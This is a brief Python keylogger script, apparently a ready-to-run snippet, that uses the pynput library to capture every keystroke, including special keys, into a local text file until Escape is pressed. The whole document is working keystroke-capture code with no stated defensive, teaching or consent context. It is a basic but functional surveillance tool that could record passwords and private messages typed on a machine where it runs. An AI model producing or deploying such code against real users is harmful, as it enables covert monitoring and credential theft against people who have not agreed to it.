# Install the 'pynput' library first: pip install pynput
from pynput.keyboard import Key, Listener

# File where keystrokes will be logged
log_file = "key_log.txt"

def on_press(key):
    try:
        # Open the file in append mode
        with open(log_file, "a") as f:
            f.write(f"{key.char}")  # Log alphanumeric keys
    except AttributeError:
        # Handle special keys (e.g., space, enter, shift, etc.)
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            elif key == Key.tab:
                f.write("\t")
            else:
                f.write(f" [{key}] ")

def on_release(key):
    # Stop the listener if escape key is pressed
    if key == Key.esc:
        return False

# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
